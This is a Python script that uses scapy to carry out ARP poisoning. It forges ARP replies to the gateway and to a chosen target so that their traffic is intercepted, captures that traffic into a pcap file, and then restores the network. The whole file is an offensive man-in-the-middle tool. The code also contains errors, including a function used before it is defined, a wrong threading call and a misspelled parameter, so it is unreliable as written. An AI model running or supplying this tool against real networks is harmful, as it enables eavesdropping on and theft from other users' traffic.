from scapy.all import *
import os, sys, threading, signal

interface = ""
target_ip = ""
gateway_ip = ""
packet_count = 1000

# set interfcae
conf.iface = interface

# turn off output
conf.verb = 0

print(f'[*] Setting up {interface}')

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print(f'[!] Failed to get gateway MAC. Exiting')
    sys.exit(0)
else:
    print(f'[*] Gateway {gateway_ip} is at {gateway_mac}')

target_mac = get_mac(target_ip)

if target_mac is None:
    print(f'[!] Failed to get target MAC. Exiting')
    sys.exit(0)
else:
    print(f'[*] Target {target_ip} is at {target_mac}')

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # different method using send
    print(f'[*] restoring target...')
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target_mac), count=5)

    # signal the end of the main thread
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):
    # get MAC address from a given IP
    
    responses,unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), timeout=2, retry=10)

    # return the MAC address from a response
    for s,r in responses:
        return r[Ether].src
        return None

def poison_target(gateway_ip, gatway_mac, target_ip, target_mac):

    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print(f'[*] Beginning the ARP poison. [CTRL-C to stop]')

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    
    print(f'[*] ARP poison attack finished.')
    return



# start the poison thread
poison_thread = threading(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print(f'[*] Starting sniffer for {packet_count} packets')
    
    bpf_filter = f'ip host {target_ip}'
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
    
    # write out the captured packets
    wrpcap('arper.pcap', packets)

    # restore the network
    restore_target( gateway_ip, gateway_mac, target_ip, target_mac )

except KeyboardInterrupt:
    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)